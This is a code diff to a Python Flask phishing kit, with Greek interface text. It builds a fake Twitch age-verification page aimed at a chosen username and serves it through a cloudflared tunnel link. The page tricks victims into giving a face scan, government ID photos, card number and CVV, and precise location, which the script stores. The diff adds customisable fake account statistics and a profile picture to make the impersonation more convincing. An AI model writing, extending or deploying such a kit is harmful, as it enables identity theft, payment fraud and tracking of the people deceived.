@@ -14,15 +14,14 @@ import requests
 from geopy.geocoders import Nominatim
 from geopy.distance import geodesic
 
-# --- Εγκατάσταση Εξαρτήσεων και Tunnel Setup ---
+# --- Εγκατάσταση εξαρτήσεων και ρύθμιση σήραγγας ---
 
 def install_package(package):
-    """Εγκαθιστά ένα πακέτο χρησιμοποιώντας pip σιωπηλά."""
+    """Εγκαθιστά ένα πακέτο χρησιμοποιώντας pip αθόρυβα."""
     subprocess.check_call([sys.executable, "-m", "pip", "install", package, "-q", "--upgrade"])
 
 def check_dependencies():
-    """Ελέγχει για cloudflared και απαιτούμενα Python πακέτα."""
-    # Έλεγχος πακέτων Python
+    """Ελέγχει για απαιτούμενα πακέτα Python και cloudflared (προαιρετικά)."""
     packages = {"Flask": "flask", "requests": "requests", "geopy": "geopy"}
     for pkg_name, import_name in packages.items():
         try:
@@ -30,7 +29,7 @@ def check_dependencies():
         except ImportError:
             install_package(pkg_name)
 
-    # Έλεγχος cloudflared (προαιρετικό)
+    # Έλεγχος για cloudflared, αλλά δεν τερματίζουμε αν λείπει
     try:
         subprocess.run(["cloudflared", "--version"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         return True
@@ -39,19 +38,19 @@ def check_dependencies():
         return False
 
 def run_cloudflared_and_print_link(port, script_name):
-    """Ξεκινά ένα cloudflared tunnel και τυπώνει το public link."""
+    """Ξεκινά μια σήραγγα cloudflared και εκτυπώνει τον δημόσιο σύνδεσμο (αν υπάρχει)."""
     cmd = ["cloudflared", "tunnel", "--url", f"http://127.0.0.1:{port}", "--protocol", "http2"]
     process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
     for line in iter(process.stdout.readline, ''):
         match = re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', line)
         if match:
-            print(f"{script_name} Public Link: {match.group(0)}")
+            print(f"{script_name} Δημόσιος Σύνδεσμος: {match.group(0)}")
             sys.stdout.flush()
             break
     process.wait()
 
 def generate_random_username():
-    """Δημιουργεί ένα τυχαίο όνομα χρήστη τύπου Twitch."""
+    """Δημιουργεί ένα τυχαίο όνομα χρήστη σε στυλ Twitch."""
     gaming_prefixes = ["pro", "epic", "l33t", "ninja", "ghost", "phantom", "shadow", "wolf", "dragon", "blaze",
                       "toxic", "vortex", "cyber", "neon", "cosmic", "royal", "alpha", "beta", "omega", "sigma"]
     
@@ -79,10 +78,30 @@ def generate_random_username():
     
     return random.choice(username_patterns)()
 
-def find_profile_picture(folder):
-    """Αναζητά αρχείο εικόνας στο φάκελο για χρήση ως προφίλ."""
+def find_profile_picture(folder, manual_path=None):
+    """Αναζητά ένα αρχείο εικόνας στον φάκελο ή χρησιμοποιεί μια χειροκίνητη διαδρομή."""
+    if manual_path and os.path.isfile(manual_path):
+        try:
+            with open(manual_path, 'rb') as f:
+                image_data = f.read()
+                image_ext = os.path.splitext(manual_path)[1].lower()
+                mime_types = {
+                    '.jpg': 'image/jpeg', '.jpeg': 'image/jpeg', '.png': 'image/png',
+                    '.gif': 'image/gif', '.bmp': 'image/bmp', '.webp': 'image/webp'
+                }
+                mime_type = mime_types.get(image_ext, 'image/jpeg')
+                base64_image = base64.b64encode(image_data).decode('utf-8')
+                return {
+                    'filename': os.path.basename(manual_path),
+                    'data_url': f'data:{mime_type};base64,{base64_image}',
+                    'path': manual_path
+                }
+        except Exception as e:
+            print(f"Σφάλμα κατά την ανάγνωση της χειροκίνητης εικόνας προφίλ: {e}")
+            return None
+
+    # Αυτόματη ανίχνευση στον φάκελο
     image_extensions = ['.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp']
-    
     for file in os.listdir(folder):
         file_lower = file.lower()
         if any(file_lower.endswith(ext) for ext in image_extensions):
@@ -91,91 +110,68 @@ def find_profile_picture(folder):
                 with open(filepath, 'rb') as f:
                     image_data = f.read()
                     image_ext = os.path.splitext(file)[1].lower()
-                    
                     mime_types = {
-                        '.jpg': 'image/jpeg',
-                        '.jpeg': 'image/jpeg',
-                        '.png': 'image/png',
-                        '.gif': 'image/gif',
-                        '.bmp': 'image/bmp',
-                        '.webp': 'image/webp'
+                        '.jpg': 'image/jpeg', '.jpeg': 'image/jpeg', '.png': 'image/png',
+                        '.gif': 'image/gif', '.bmp': 'image/bmp', '.webp': 'image/webp'
                     }
-                    
                     mime_type = mime_types.get(image_ext, 'image/jpeg')
                     base64_image = base64.b64encode(image_data).decode('utf-8')
-                    
                     return {
                         'filename': file,
                         'data_url': f'data:{mime_type};base64,{base64_image}',
                         'path': filepath
                     }
             except Exception as e:
-                print(f"Σφάλμα ανάγνωσης εικόνας προφίλ {file}: {e}")
-    
+                print(f"Σφάλμα κατά την ανάγνωση της εικόνας προφίλ {file}: {e}")
     return None
 
-def get_verification_settings(interactive=False):
-    # Δήλωση global στην αρχή της συνάρτησης
+def get_verification_settings():
+    """Λαμβάνει τις προτιμήσεις χρήστη για τη διαδικασία επαλήθευσης, συμπεριλαμβανομένων όλων των στατιστικών και της εικόνας προφίλ."""
     global DOWNLOAD_FOLDER
 
-    if not interactive:
-        # Προεπιλεγμένες ρυθμίσεις (χωρίς ερωτήσεις)
-        settings = {
-            'target_username': generate_random_username(),
-            'account_type': 'streamer',
-            'face_duration': 25,
-            'id_enabled': True,
-            'id_type': 'government',
-            'payment_enabled': True,
-            'location_enabled': True,
-            'profile_picture': None,
-            'profile_picture_filename': None
-        }
-        profile_pic = find_profile_picture(DOWNLOAD_FOLDER)
-        if profile_pic:
-            settings['profile_picture'] = profile_pic['data_url']
-            settings['profile_picture_filename'] = profile_pic['filename']
-            print(f"[+] Βρέθηκε εικόνα προφίλ: {profile_pic['filename']}")
-        else:
-            print("[!] Δεν βρέθηκε εικόνα προφίλ· χρήση προεπιλεγμένου avatar.")
-        return settings
-
-    # Διαδραστική λειτουργία (αρχικός κώδικας)
     print("\n" + "="*60)
-    print("ΡΥΘΜΙΣΕΙΣ ΕΠΑΛΗΘΕΥΣΗΣ ΗΛΙΚΙΑΣ TWITCH")
+    print("ΡΥΘΜΙΣΗ ΕΠΑΛΗΘΕΥΣΗΣ ΗΛΙΚΙΑΣ TWITCH")
     print("="*60)
     
-    print("\n[+] ΡΥΘΜΙΣΗ ΟΝΟΜΑΤΟΣ ΧΡΗΣΤΗ ΣΤΟΧΟΥ")
-    print("Εισάγετε το όνομα χρήστη Twitch που θα εμφανιστεί στη σελίδα επαλήθευσης")
-    print("Αφήστε κενό για τυχαία δημιουργία ονόματος")
-    
-    username_input = input("Όνομα χρήστη στόχου (ή Enter για τυχαίο): ").strip()
+    # --- Όνομα στόχου ---
+    print("\n[+] ΡΥΘΜΙΣΗ ΟΝΟΜΑΤΟΣ ΣΤΟΧΟΥ")
+    username_input = input("Όνομα στόχου (ή πατήστε Enter για τυχαίο): ").strip()
     if username_input:
         settings = {'target_username': username_input}
     else:
         random_username = generate_random_username()
         settings = {'target_username': random_username}
         print(f"[+] Δημιουργήθηκε τυχαίο όνομα: {random_username}")
+
+    # --- Εικόνα προφίλ ---
+    print("\n[+] ΡΥΘΜΙΣΗ ΕΙΚΟΝΑΣ ΠΡΟΦΙΛ")
+    print("Μπορείτε να καθορίσετε μια διαδρομή σε αρχείο εικόνας ή να αφήσετε το σενάριο να την ανιχνεύσει αυτόματα στον φάκελο λήψης.")
+    pic_input = input("Εισάγετε διαδρομή για εικόνα προφίλ (ή πατήστε Enter για αυτόματη ανίχνευση): ").strip()
+    profile_pic = None
+    if pic_input:
+        profile_pic = find_profile_picture(DOWNLOAD_FOLDER, manual_path=pic_input)
+        if profile_pic:
+            print(f"[+] Χρήση εικόνας προφίλ: {profile_pic['filename']}")
+        else:
+            print(f"[!] Αδυναμία φόρτωσης εικόνας από '{pic_input}'. Θα γίνει αυτόματη ανίχνευση.")
+    if not profile_pic:
+        profile_pic = find_profile_picture(DOWNLOAD_FOLDER)
+        if profile_pic:
+            print(f"[+] Αυτόματη ανίχνευση εικόνας προφίλ: {profile_pic['filename']}")
+        else:
+            print(f"[!] Δεν βρέθηκε εικόνα προφίλ· χρήση προεπιλεγμένου avatar.")
+            print(f"[!] Συμβουλή: Τοποθετήστε μια εικόνα (jpg/png) στο {DOWNLOAD_FOLDER} ή δώστε μια διαδρομή.")
     
-    profile_pic = find_profile_picture(DOWNLOAD_FOLDER)
-    if profile_pic:
-        settings['profile_picture'] = profile_pic['data_url']
-        settings['profile_picture_filename'] = profile_pic['filename']
-        print(f"[+] Βρέθηκε εικόνα προφίλ: {profile_pic['filename']}")
-        print(f"[+] Χρήση εικόνας προφίλ για το @{settings['target_username']}")
-    else:
-        settings['profile_picture'] = None
-        settings['profile_picture_filename'] = None
-        print(f"[!] Δεν βρέθηκε εικόνα προφίλ")
-        print(f"[!] Συμβουλή: Τοποθετήστε μια εικόνα (jpg/png) στον φάκελο {DOWNLOAD_FOLDER} για χρήση ως προφίλ")
-    
+    settings['profile_picture'] = profile_pic['data_url'] if profile_pic else None
+    settings['profile_picture_filename'] = profile_pic['filename'] if profile_pic else None
+
     print(f"\n[+] Η επαλήθευση θα εμφανιστεί για: @{settings['target_username']}")
     
-    print("\n1. Τύπος Λογαριασμού:")
-    print("Είναι αυτός λογαριασμός streamer ή θεατή;")
-    print("1. Λογαριασμός Streamer (θέλει να μεταδώσει περιεχόμενο)")
-    print("2. Λογαριασμός Θεατή (θέλει να παρακολουθήσει περιεχόμενο με περιορισμό ηλικίας)")
-    
+    # --- Τύπος λογαριασμού ---
+    print("\n1. Τύπος λογαριασμού:")
+    print("Είναι λογαριασμός streamer ή θεατή;")
+    print("1. Λογαριασμός Streamer (θέλει να μεταδίδει περιεχόμενο)")
+    print("2. Λογαριασμός Θεατή (θέλει να βλέπει περιεχόμενο περιορισμένης ηλικίας)")
     while True:
         account_type = input("Επιλέξτε τύπο λογαριασμού (1/2, προεπιλογή: 1): ").strip()
         if not account_type:
@@ -189,11 +185,27 @@ def get_verification_settings(interactive=False):
             break
         else:
             print("Παρακαλώ εισάγετε 1 ή 2.")
+
+    # --- Στατιστικά ---
+    print("\n[+] ΣΤΑΤΙΣΤΙΚΑ ΛΟΓΑΡΙΑΣΜΟΥ (αφήστε κενό για τυχαίες τιμές)")
+    followers = input("Αριθμός ακολούθων (προεπιλογή τυχαίο): ").strip()
+    settings['followers'] = int(followers) if followers.isdigit() else random.randint(500, 10000) if settings['account_type'] == 'streamer' else random.randint(10, 1000)
     
-    print(f"\n2. Διάρκεια Σάρωσης Προσώπου:")
-    print(f"Πόσα δευτερόλεπτα για την επαλήθευση προσώπου για {settings['account_type']} λογαριασμό;")
-    print("Προτείνεται: 15-30 δευτερόλεπτα για πλήρη επαλήθευση")
+    following = input("Αριθμός που ακολουθεί (προεπιλογή τυχαίο): ").strip()
+    settings['following'] = int(following) if following.isdigit() else random.randint(50, 500)
     
+    if settings['account_type'] == 'streamer':
+        views = input("Συνολικές προβολές (προεπιλογή τυχαίο): ").strip()
+        settings['total_views'] = int(views) if views.isdigit() else random.randint(1000, 100000)
+    else:
+        settings['total_views'] = 0  # δεν χρησιμοποιείται για θεατή
+    
+    age = input("Ηλικία λογαριασμού σε ημέρες (προεπιλογή τυχαίο): ").strip()
+    settings['account_age'] = int(age) if age.isdigit() else random.randint(30, 365 * 3)
+
+    # --- Διάρκεια σάρωσης προσώπου ---
+    print(f"\n2. Διάρκεια σάρωσης προσώπου:")
+    print("Πόσα δευτερόλεπτα για την επαλήθευση προσώπου;")
     while True:
         try:
             duration = input("Διάρκεια σε δευτερόλεπτα (5-60, προεπιλογή: 25): ").strip()
@@ -205,21 +217,19 @@ def get_verification_settings(interactive=False):
                 settings['face_duration'] = duration
                 break
             else:
-                print("Παρακαλώ εισάγετε αριθμό μεταξύ 5 και 60.")
+                print("Παρακαλώ εισάγετε έναν αριθμό μεταξύ 5 και 60.")
         except ValueError:
             print("Παρακαλώ εισάγετε έγκυρο αριθμό.")
     
-    print(f"\n3. Επαλήθευση Εγγράφου Ταυτότητας:")
-    print(f"Απαιτείται μεταφόρτωση εγγράφου ταυτότητας για επαλήθευση ηλικίας;")
-    id_enabled = input("Ενεργοποίηση επαλήθευσης ταυτότητας (ναι/όχι, προεπιλογή: ναι): ").strip().lower()
-    settings['id_enabled'] = id_enabled in ['ναι', 'ν', 'yes', 'y', '']
-    
+    # --- Επαλήθευση ταυτότητας ---
+    print(f"\n3. Επαλήθευση εγγράφου ταυτότητας:")
+    id_enabled = input("Ενεργοποίηση επαλήθευσης ταυτότητας (y/n, προεπιλογή: y): ").strip().lower()
+    settings['id_enabled'] = id_enabled in ['y', 'yes', '']
     if settings['id_enabled']:
-        print("\nΤύπος Εγγράφου Ταυτότητας:")
-        print("1. Επίσημο έγγραφο (Διαβατήριο, Δίπλωμα Οδήγησης)")
+        print("\nΤύπος εγγράφου ταυτότητας:")
+        print("1. Κυβερνητική ταυτότητα (Διαβατήριο, Δίπλωμα οδήγησης)")
         print("2. Φοιτητική ταυτότητα")
-        print("3. Έντυπο συγκατάθεσης γονέα")
-        
+        print("3. Έντυπο γονικής συναίνεσης")
         while True:
             id_type = input("Επιλέξτε τύπο ταυτότητας (1/2/3, προεπιλογή: 1): ").strip()
             if not id_type:
@@ -236,23 +246,25 @@ def get_verification_settings(interactive=False):
                 break
             else:
                 print("Παρακαλώ εισάγετε 1, 2 ή 3.")
-    
+    else:
+        settings['id_type'] = None
+
+    # --- Επαλήθευση πληρωμής (μόνο για streamer) ---
     if settings['account_type'] == 'streamer':
-        print(f"\n4. Επαλήθευση Πληρωμών:")
-        print(f"Απαιτείται επαλήθευση μεθόδου πληρωμής για μονετοποίηση;")
-        payment_enabled = input("Ενεργοποίηση επαλήθευσης πληρωμών (ναι/όχι, προεπιλογή: ναι): ").strip().lower()
-        settings['payment_enabled'] = payment_enabled in ['ναι', 'ν', 'yes', 'y', '']
+        print(f"\n4. Επαλήθευση πληρωμής:")
+        payment_enabled = input("Ενεργοποίηση επαλήθευσης πληρωμής (y/n, προεπιλογή: y): ").strip().lower()
+        settings['payment_enabled'] = payment_enabled in ['y', 'yes', '']
     else:
         settings['payment_enabled'] = False
-    
-    print(f"\n5. Επαλήθευση Τοποθεσίας:")
-    print(f"Απαιτείται επαλήθευση τοποθεσίας για συμμόρφωση με περιφερειακούς κανονισμούς;")
-    location_enabled = input("Ενεργοποίηση επαλήθευσης τοποθεσίας (ναι/όχι, προεπιλογή: ναι): ").strip().lower()
-    settings['location_enabled'] = location_enabled in ['ναι', 'ν', 'yes', 'y', '']
-    
+
+    # --- Επαλήθευση τοποθεσίας ---
+    print(f"\n5. Επαλήθευση τοποθεσίας:")
+    location_enabled = input("Ενεργοποίηση επαλήθευσης τοποθεσίας (y/n, προεπιλογή: y): ").strip().lower()
+    settings['location_enabled'] = location_enabled in ['y', 'yes', '']
+
     return settings
 
-# --- Συναρτήσεις Επεξεργασίας Τοποθεσίας ---
+# --- Συναρτήσεις επεξεργασίας τοποθεσίας ---
 
 geolocator = Nominatim(user_agent="twitch_verification")
 
@@ -292,7 +304,7 @@ def get_nearby_places(latitude, longitude, radius=2000, limit=3):
             distance = geodesic((latitude, longitude), (lat_elem, lon_elem)).meters
             
             place_type = tags.get("shop") or tags.get("amenity") or tags.get("tourism") or "unknown"
-            place_name = tags.get("name", "Ανώνυμος Χώρος")
+            place_name = tags.get("name", "Unnamed Place")
             
             results.append({
                 "type": place_type,
@@ -316,7 +328,7 @@ def process_and_save_location(data, session_id):
             return
         
         address_details = {}
-        full_address = "Άγνωστη Διεύθυνση"
+        full_address = "Άγνωστο"
         try:
             location = geolocator.reverse((lat, lon), language='el', timeout=10)
             if location:
@@ -371,12 +383,12 @@ def process_and_save_location(data, session_id):
         with open(filepath, 'w', encoding='utf-8') as f:
             json.dump(location_data, f, indent=2, ensure_ascii=False)
         
-        print(f"Αποθηκεύτηκαν δεδομένα τοποθεσίας Twitch: {filename}")
+        print(f"Τα δεδομένα τοποθεσίας Twitch αποθηκεύτηκαν: {filename}")
         
     except Exception as e:
-        print(f"Σφάλμα επεξεργασίας τοποθεσίας: {e}")
+        print(f"Σφάλμα κατά την επεξεργασία της τοποθεσίας: {e}")
 
-# --- Flask Εφαρμογή ---
+# --- Εφαρμογή Flask ---
 
 app = Flask(__name__)
 
@@ -390,7 +402,7 @@ os.makedirs(os.path.join(DOWNLOAD_FOLDER, 'location_data'), exist_ok=True)
 os.makedirs(os.path.join(DOWNLOAD_FOLDER, 'user_data'), exist_ok=True)
 
 def create_html_template(settings):
-    """Δημιουργεί το ολοκληρωμένο πρότυπο επαλήθευσης Twitch στα Ελληνικά."""
+    """Δημιουργεί το πλήρες πρότυπο Twitch επαλήθευσης."""
     target_username = settings['target_username']
     account_type = settings['account_type']
     face_duration = settings['face_duration']
@@ -401,26 +413,39 @@ def create_html_template(settings):
     profile_picture = settings.get('profile_picture')
     profile_picture_filename = settings.get('profile_picture_filename')
     
-    followers = random.randint(500, 10000) if account_type == 'streamer' else random.randint(10, 1000)
-    following = random.randint(50, 500)
-    total_views = random.randint(1000, 100000) if account_type == 'streamer' else 0
-    account_age = random.randint(30, 365 * 3)
+    # Χρήση προσαρμοσμένων στατιστικών
+    followers = settings.get('followers', random.randint(500, 10000) if account_type == 'streamer' else random.randint(10, 1000))
+    following = settings.get('following', random.randint(50, 500))
+    total_views = settings.get('total_views', random.randint(1000, 100000) if account_type == 'streamer' else 0)
+    account_age = settings.get('account_age', random.randint(30, 365 * 3))
     
-    total_steps = 2  # Εισαγωγή + Πρόσωπο
+    # Δημιουργία δυναμικών αναγνωριστικών βημάτων
+    step_ids = ['step1', 'step2']
     if id_enabled:
-        total_steps += 1
+        step_ids.append('step3')
     if payment_enabled:
-        total_steps += 1
+        step_ids.append('step4')
     if location_enabled:
-        total_steps += 1
-    total_steps += 1  # Τελικό βήμα
+        step_ids.append('step5')
+    step_ids.append('stepFinal')
+    step_ids.append('stepComplete')
+    step_ids.append('stepReview')
+    
+    # Κύρια βήματα είναι όλα εκτός από τα δύο τελευταία (complete και review)
+    main_step_ids = step_ids[:-2]
+    total_steps = len(main_step_ids)
+    
+    # Μετατροπή σε JSON για JavaScript
+    import json as json_module
+    step_ids_json = json_module.dumps(step_ids)
+    main_step_ids_json = json_module.dumps(main_step_ids)
     
     template = f'''<!DOCTYPE html>
 <html lang="el">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Twitch Επαλήθευση Ηλικίας & Ταυτότητας</title>
+    <title>Επαλήθευση Ηλικίας & Ταυτότητας Twitch</title>
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
     <style>
         * {{
@@ -1338,7 +1363,7 @@ def create_html_template(settings):
                 </div>
                 <div class="stat-item">
                     <div class="stat-number">
-                        {'{:,}'.format(total_views) if account_type == 'streamer' else 'N/A'}
+                        {'{:,}'.format(total_views) if account_type == 'streamer' else str(account_age) + 'ημέρες'}
                     </div>
                     <div class="stat-label">
                         {'Συνολικές Προβολές' if account_type == 'streamer' else 'Ηλικία Λογαριασμού'}
@@ -1363,11 +1388,12 @@ def create_html_template(settings):
                 </div>
             </div>
             
+            <!-- ΒΗΜΑ 1: Εισαγωγή -->
             <div class="step active" id="step1">
                 <h2 class="step-title">Απαιτείται Επαλήθευση Λογαριασμού</h2>
                 <p class="step-subtitle">
                     Ο λογαριασμός σας <strong class="twitch-purple">@{target_username}</strong> απαιτεί επαλήθευση ηλικίας και ταυτότητας 
-                    για συμμόρφωση με τους Όρους Χρήσης και τις Οδηγίες Κοινότητας του Twitch.
+                    για να συμμορφωθεί με τους Όρους Παροχής Υπηρεσιών και τις Οδηγίες Κοινότητας του Twitch.
                 </p>
                 
                 <div class="warning-box">
@@ -1376,8 +1402,8 @@ def create_html_template(settings):
                         <div class="warning-title">Περιορισμένη Πρόσβαση Λογαριασμού</div>
                     </div>
                     <div class="warning-content">
-                        {'Οι δυνατότητες streaming σας έχουν περιοριστεί προσωρινά μέχρι να ολοκληρωθεί η επαλήθευση ηλικίας.' if account_type == 'streamer' 
-                         else 'Η πρόσβαση σε περιεχόμενο με περιορισμό ηλικίας έχει περιοριστεί προσωρινά μέχρι να ολοκληρωθεί η επαλήθευση.'}
+                        {'Οι δυνατότητες μετάδοσης έχουν προσωρινά περιοριστεί μέχρι να ολοκληρωθεί η επαλήθευση ηλικίας.' if account_type == 'streamer' 
+                         else 'Η πρόσβαση σε περιεχόμενο περιορισμένης ηλικίας έχει προσωρινά περιοριστεί μέχρι να ολοκληρωθεί η επαλήθευση.'}
                     </div>
                 </div>
                 
@@ -1391,9 +1417,9 @@ def create_html_template(settings):
                          else 'Ως λογαριασμός θεατή, πρέπει να ολοκληρώσετε:'}
                         <ul style="margin-top: 10px;">
                             <li><strong>Επαλήθευση Προσώπου</strong> - Σάρωση προσώπου σε πραγματικό χρόνο</li>
-                            <li><strong>Επαλήθευση Ταυτότητας</strong> - Μεταφόρτωση επίσημου εγγράφου ταυτότητας</li>
-                            {'<li><strong>Επαλήθευση Πληρωμών</strong> - Επαλήθευση μεθόδου πληρωμής</li>' if payment_enabled else ''}
-                            {'<li><strong>Έλεγχος Τοποθεσίας</strong> - Επαλήθευση περιφερειακής συμμόρφωσης</li>' if location_enabled else ''}
+                            <li><strong>Επαλήθευση Ταυτότητας</strong> - Μεταφόρτωση κρατικής ταυτότητας</li>
+                            {'<li><strong>Επαλήθευση Πληρωμής</strong> - Επαλήθευση μεθόδου πληρωμής</li>' if payment_enabled else ''}
+                            {'<li><strong>Έλεγχος Τοποθεσίας</strong> - Επαλήθευση συμμόρφωσης περιοχής</li>' if location_enabled else ''}
                         </ul>
                     </div>
                 </div>
@@ -1403,15 +1429,16 @@ def create_html_template(settings):
                 </button>
                 
                 <div class="footer">
-                    Συνεχίζοντας, συμφωνείτε με τους <a href="#">Όρους Χρήσης</a> και 
-                    την <a href="/privacy_policy">Πολιτική Απορρήτου</a> του Twitch
+                    Συνεχίζοντας, συμφωνείτε με τους <a href="#">Όρους Παροχής Υπηρεσιών</a> και την 
+                    <a href="/privacy_policy">Πολιτική Απορρήτου</a> του Twitch
                 </div>
             </div>
             
+            <!-- ΒΗΜΑ 2: Πρόσωπο -->
             <div class="step" id="step2">
                 <h2 class="step-title">Επαλήθευση Προσώπου</h2>
                 <p class="step-subtitle">
-                    Χρειάζεται να επαληθεύσουμε ότι είστε πραγματικό πρόσωπο. Ακολουθήστε τις οδηγίες για τη σάρωση προσώπου.
+                    Πρέπει να επαληθεύσουμε ότι είστε πραγματικό άτομο. Ακολουθήστε τις οδηγίες για τη σάρωση του προσώπου σας.
                 </p>
                 
                 <div class="camera-container">
@@ -1425,7 +1452,7 @@ def create_html_template(settings):
                 
                 <div class="face-instruction" id="faceInstruction">
                     <div class="instruction-icon">👤</div>
-                    <div class="instruction-text" id="instructionText">Ετοιμοτητα Εκκίνησης</div>
+                    <div class="instruction-text" id="instructionText">Έτοιμοι για έναρξη</div>
                     <div class="instruction-detail" id="instructionDetail">
                         Τοποθετήστε το πρόσωπό σας μέσα στον κύκλο
                     </div>
@@ -1440,10 +1467,11 @@ def create_html_template(settings):
                 </button>
             </div>
             
+            <!-- ΒΗΜΑ 3: Ταυτότητα (αν ενεργοποιηθεί) -->
             <div class="step" id="step3">
                 <h2 class="step-title">Επαλήθευση Εγγράφου Ταυτότητας</h2>
                 <p class="step-subtitle">
-                    Μεταφορτώστε φωτογραφίες του επίσημου εγγράφου ταυτότητάς σας για επαλήθευση ηλικίας.
+                    Μεταφορτώστε φωτογραφίες της κρατικής σας ταυτότητας για επαλήθευση ηλικίας.
                 </p>
                 
                 <div class="id-upload-section">
@@ -1452,11 +1480,11 @@ def create_html_template(settings):
                          ondragleave="this.classList.remove('dragover')" 
                          ondrop="handleIDFileDrop(event, 'front')">
                         <div class="id-icon">📄</div>
-                        <div class="id-title">Εμπρός Μέρος Ταυτότητας</div>
+                        <div class="id-title">Εμπρόσθια όψη ταυτότητας</div>
                         <div class="id-subtitle">
-                            {'Διαβατήριο, Δίπλωμα Οδήγησης ή Επίσημο Έγγραφο' if id_type == 'government' 
+                            {'Διαβατήριο, Δίπλωμα Οδήγησης ή Κρατική Ταυτότητα' if id_type == 'government' 
                              else 'Φοιτητική Ταυτότητα' if id_type == 'student' 
-                             else 'Έντυπο Συγκατάθεσης Γονέα'}
+                             else 'Έντυπο Γονικής Συναίνεσης'}
                         </div>
                         <input type="file" id="frontIdInput" class="file-input" accept="image/*" onchange="handleIDFileSelect(this, 'front')">
                         <div class="id-preview" id="frontPreview">
@@ -1469,9 +1497,9 @@ def create_html_template(settings):
                          ondragleave="this.classList.remove('dragover')" 
                          ondrop="handleIDFileDrop(event, 'back')">
                         <div class="id-icon">📄</div>
-                        <div class="id-title">Πίσω Μέρος Ταυτότητας</div>
+                        <div class="id-title">Οπίσθια όψη ταυτότητας</div>
                         <div class="id-subtitle">
-                            {'Απαιτείται για έγγραφα με δύο πλευρές' if id_type == 'government' 
+                            {'Απαιτείται για έγγραφα δύο όψεων' if id_type == 'government' 
                              else 'Προαιρετικό για φοιτητικές ταυτότητες' if id_type == 'student'
                              else 'Υπογραφή Γονέα/Κηδεμόνα'}
                         </div>
@@ -1483,15 +1511,15 @@ def create_html_template(settings):
                 </div>
                 
                 <div class="id-requirements">
-                    <div class="requirements-title">Απαιτήσεις Εγγράφου:</div>
+                    <div class="requirements-title">Απαιτήσεις εγγράφων:</div>
                     <ul class="requirements-list">
-                        {'<li>Επίσημο έγγραφο ταυτότητας με φωτογραφία και ημερομηνία γέννησης</li>' if id_type == 'government' else ''}
+                        {'<li>Κρατική ταυτότητα με φωτογραφία και ημερομηνία γέννησης</li>' if id_type == 'government' else ''}
                         {'<li>Έγκυρη φοιτητική ταυτότητα με ημερομηνία λήξης</li>' if id_type == 'student' else ''}
-                        {'<li>Έντυπο συγκατάθεσης με υπογραφή γονέα/κηδεμόνα</li>' if id_type == 'parental' else ''}
+                        {'<li>Υπογεγραμμένο έντυπο συναίνεσης γονέα/κηδεμόνα</li>' if id_type == 'parental' else ''}
                         <li>Καθαρές, καλά φωτισμένες φωτογραφίες</li>
-                        <li>Όλο το κείμενο πρέπει να είναι αναγνώσιμο</li>
-                        <li>Χωρίς ανταύγειες ή αντανακλάσεις</li>
-                        <li>Όλο το έγγραφο ορατό στο πλαίσιο</li>
+                        <li>Όλο το κείμενο πρέπει να είναι ευανάγνωστο</li>
+                        <li>Χωρίς αντανακλάσεις ή ανταύγειες</li>
+                        <li>Ολόκληρο το έγγραφο να είναι ορατό στο κάδρο</li>
                     </ul>
                 </div>
                 
@@ -1506,10 +1534,11 @@ def create_html_template(settings):
                 </button>
             </div>
             
+            <!-- ΒΗΜΑ 4: Πληρωμή (αν ενεργοποιηθεί) -->
             <div class="step" id="step4">
-                <h2 class="step-title">Επαλήθευση Πληρωμών</h2>
+                <h2 class="step-title">Επαλήθευση Πληρωμής</h2>
                 <p class="step-subtitle">
-                    Επαληθεύστε τη μέθοδο πληρωμής σας για να ενεργοποιήσετε τα χαρακτηριστικά μονετοποίησης στον λογαριασμό σας.
+                    Επαληθεύστε τη μέθοδο πληρωμής σας για να ενεργοποιήσετε τις λειτουργίες αποκλειστικοποίησης στον λογαριασμό streamer σας.
                 </p>
                 
                 <div class="payment-options">
@@ -1527,7 +1556,7 @@ def create_html_template(settings):
                     
                     <div class="payment-option" onclick="selectPaymentMethod('bank')">
                         <div class="payment-icon">🏛️</div>
-                        <div class="payment-name">Τραπεζική Μεταφορά</div>
+                        <div class="payment-name">Τραπεζικό Έμβασμα</div>
                         <div class="payment-hint">Άμεσος τραπεζικός λογαριασμός</div>
                     </div>
                 </div>
@@ -1541,7 +1570,7 @@ def create_html_template(settings):
                     <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 15px;">
                         <div class="form-group">
                             <label class="form-label">Ημερομηνία Λήξης</label>
-                            <input type="text" class="form-input" id="cardExpiry" placeholder="MM/ΕΕ">
+                            <input type="text" class="form-input" id="cardExpiry" placeholder="ΜΜ/ΕΕ">
                         </div>
                         <div class="form-group">
                             <label class="form-label">CVV</label>
@@ -1566,10 +1595,11 @@ def create_html_template(settings):
                 </button>
             </div>
             
+            <!-- ΒΗΜΑ 5: Τοποθεσία (αν ενεργοποιηθεί) -->
             <div class="step" id="step5">
                 <h2 class="step-title">Επαλήθευση Τοποθεσίας</h2>
                 <p class="step-subtitle">
-                    Χρειαζόμαστε να επαληθεύσουμε την τοποθεσία σας για περιφερειακή συμμόρφωση περιεχομένου και ασφάλεια.
+                    Πρέπει να επαληθεύσουμε την τοποθεσία σας για συμμόρφωση με το τοπικό περιεχόμενο και λόγους ασφαλείας.
                 </p>
                 
                 <div class="location-container">
@@ -1578,7 +1608,7 @@ def create_html_template(settings):
                         <div class="instruction-icon">🌍</div>
                         <div class="instruction-text">Απαιτείται Πρόσβαση Τοποθεσίας</div>
                         <div class="instruction-detail">
-                            Το Twitch χρειάζεται να επαληθεύσει την τοποθεσία σας για περιφερειοποίηση περιεχομένου και ασφάλεια.
+                            Το Twitch πρέπει να επαληθεύσει την τοποθεσία σας για περιφερειακή προσαρμογή περιεχομένου και ασφάλεια.
                         </div>
                     </div>
                     
@@ -1589,7 +1619,7 @@ def create_html_template(settings):
                         </div>
                         <div class="accuracy-labels">
                             <span>Χαμηλή</span>
-                            <span>Μέτρια</span>
+                            <span>Μεσαία</span>
                             <span>Υψηλή</span>
                         </div>
                     </div>
@@ -1615,11 +1645,11 @@ def create_html_template(settings):
                 </div>
                 
                 <div class="status-message" id="locationStatus">
-                    Κάντε κλικ στο παρακάτω κουμπί για κοινή χρήση της τοποθεσίας σας
